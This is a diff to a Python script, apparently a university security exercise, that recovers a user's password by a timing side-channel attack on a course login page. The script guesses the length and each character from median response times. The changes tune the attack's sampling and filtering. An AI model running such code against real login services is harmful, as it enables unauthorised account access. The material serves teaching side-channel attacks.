@@ -1,9 +1,11 @@
 from __future__ import print_function
 import requests
 import string
+import time
 import operator
 import sys
 from tqdm import tqdm
+import concurrent.futures
 from numpy import mean, median, quantile
 
 ### TODO?: Student's T-Test
@@ -21,17 +23,17 @@ from numpy import mean, median, quantile
 URL = 'http://aoi.ise.bgu.ac.il/?user={}&password={}'
 ALL_CHARS = string.ascii_lowercase
 NUM_ROUNDS_PASSWD_LENGTH_GUESS = 10
-NUM_ROUNDS_PASSWD_GUESSING = 10
+NUM_ROUNDS_PASSWD_GUESSING = 5
 MAX_PASSWD_LENGTH = 32
 TIMEOUT = 20 # Seconds
 RETRY_LIMIT = 10
-DIFFICULTY = None
+DIFFICULTY = '3' # or None
+FILT_THRESH = 0.25 # What quntile of lowest measurements to remove before next measurement
 
 if DIFFICULTY != None:
     URL = URL + '&difficulty=' + DIFFICULTY
 
 # ========================================================================================
-
 
 def timing_attack(username):
     eprint('Sending wakeup requests...')
@@ -69,10 +71,10 @@ def is_done(username, passwd):
 
 def get_passwd_length(username):
     length2time = {length: [] for length in range(1,MAX_PASSWD_LENGTH + 1)}
-    for length in tqdm(range(1, MAX_PASSWD_LENGTH + 1)):
+    for length in range(1, MAX_PASSWD_LENGTH + 1):
         passwd = 'a' * length
         for i in range(NUM_ROUNDS_PASSWD_LENGTH_GUESS):
-            rtt, _ = send_request(username, passwd, NUM_ROUNDS_PASSWD_LENGTH_GUESS)
+            rtt, _ = send_request(username, passwd)
             length2time[length].append(rtt)
         length2time[length] = median(length2time[length]) # Take median
 
@@ -87,11 +89,22 @@ def brute_force_last(username, passwd):
             return next_char
     return '*' # Unknown
 
+# def get_rtt(username, passwd):
+#     trials = []
+#     for _ in range(NUM_ROUNDS_PASSWD_GUESSING):
+#         rtt, _ = send_request(username, passwd)
+#             trials.append(rtt)
+#         return median(trials)
+
 def get_rtts(username, passwd, i, char2AccRtt):
     for char in char2AccRtt.keys():
         new_passwd = passwd[:i] + char + passwd[i+1:]
-        rtt, _ = send_request(username, new_passwd)
-        char2AccRtt[char] = char2AccRtt[char] + rtt
+        trials = []
+        for _ in range(NUM_ROUNDS_PASSWD_GUESSING):
+            rtt, _ = send_request(username, new_passwd)
+            trials.append(rtt)
+        char2AccRtt[char] = char2AccRtt[char] + median(trials)
+        eprint(f'{new_passwd}: {median(trials)}')
     return char2AccRtt
 
 
@@ -116,7 +129,8 @@ def infer_ith_char(username, i, passwd):
     char2AccRtt = {char:0 for char in ALL_CHARS}
     while len(char2AccRtt) > 1:
         char2AccRtt = get_rtts(username, passwd, i, char2AccRtt)
-        filt = quantile(list(char2AccRtt.values()), 0.25)
+        # eprint(char2AccRtt); eprint(' -> ')
+        filt = quantile(list(char2AccRtt.values()), FILT_THRESH)
         char2AccRtt = {k:v for k,v in char2AccRtt.items() if v >= filt}
     
     best_guess = list(char2AccRtt.keys()).pop()
@@ -136,4 +150,7 @@ if __name__ == '__main__':
         eprint('Usage: python3 ex01_M1.py username')
         exit(1)
     username = sys.argv[1]
+    start = time.time()
     timing_attack(username)
+    end = time.time()
+    eprint(f'Finished in {(end-start)/60:.2f}, minutes')
